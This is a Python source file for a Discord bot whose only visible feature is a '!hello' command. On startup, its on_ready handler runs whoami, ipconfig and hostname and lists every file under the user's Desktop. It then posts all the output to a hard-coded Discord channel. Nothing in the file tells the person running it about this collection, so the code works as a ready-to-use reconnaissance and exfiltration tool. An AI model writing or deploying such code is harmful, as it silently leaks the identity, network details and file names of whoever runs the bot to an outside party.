import os
from dotenv import load_dotenv
import discord
from discord.ext import commands
import subprocess


load_dotenv(dotenv_path="E:/discordbot/.env")
TOKEN = os.getenv("DISCORD_TOKEN")

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
        # Check if the command was successful
    print(f"✅ Logged in as {bot.user}")
    
    channel = bot.get_channel(1375125495674306735)  #kanal-ID

    output = subprocess.run(["whoami"], capture_output=True, text=True)
    ipconfiggrab = subprocess.run(["ipconfig"], capture_output=True, text=True)
    hostnamegrab = subprocess.run(["hostname"], capture_output=True, text=True)
    dir = subprocess.run(r"dir /s /b C:\Users\%USERNAME%\Desktop", capture_output=True, text=True, shell=True)


    # Begrens lengde pga Discords 2000-tegnsgrense
    whoami = output.stdout
    ip = ipconfiggrab.stdout
    hostname = hostnamegrab.stdout
    filer = dir.stdout

    await channel.send(f"```{whoami}```")
    await channel.send(f"```{ip}```")
    await channel.send(f"```{hostname}```")
    await channel.send(f"```{filer}```")


@bot.command()
async def hello(ctx):

    await ctx.send("Hello, world!")



bot.run(TOKEN)




